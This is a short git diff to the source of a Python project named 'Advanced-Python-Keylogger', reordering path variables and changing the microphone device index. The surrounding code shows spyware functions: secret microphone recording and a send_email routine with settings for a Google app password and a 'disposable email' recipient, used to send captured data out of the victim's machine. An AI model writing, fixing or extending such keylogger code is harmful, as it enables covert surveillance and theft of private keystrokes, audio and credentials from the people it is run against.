@@ -32,12 +32,13 @@ audio_information = "audio.wav"
 
 microphone_time = 10
 
+file_path = "//Users//joshuamcleod//Advanced-Python-Keylogger//Keylogger"
+extend = "//"
+
+
 email_address = "##redacted##"
 password = "##redacted##"  # use google app password
 toaddr = "##redacted##"  # disposable email of your choice
-
-file_path = "//Users//joshuamcleod//Advanced-Python-Keylogger//Keylogger"
-extend = "//"
 
 
 def send_email(filename, attachment, toaddr):
@@ -112,7 +113,7 @@ def microphone():
     fs = 44100
     seconds = microphone_time
 
-    sd.default.device = (2, None)
+    sd.default.device = (0, None)
 
     print("[*] Recording microphone...")
     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
